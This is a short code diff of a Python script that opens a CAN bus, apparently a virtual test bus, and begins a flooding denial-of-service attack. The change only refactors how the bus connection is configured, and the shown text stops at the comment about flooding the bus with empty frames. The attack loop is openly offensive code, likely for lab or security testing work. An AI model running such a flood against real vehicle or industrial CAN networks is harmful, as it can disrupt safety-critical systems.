@@ -1,11 +1,11 @@
 import can
 import time
 
-from can_network import VCAN_CHANNEL, CAN_INTERFACE
+from can_network import bus_kwargs
 
 def main():
     print("Conducting Denial of Service (DoS) attack on CAN bus...")
-    bus = can.interface.Bus(channel=VCAN_CHANNEL, bustype=CAN_INTERFACE)
+    bus = can.interface.Bus(**bus_kwargs())
     try:
         while True:
             # Flood the CAN bus with empty frames
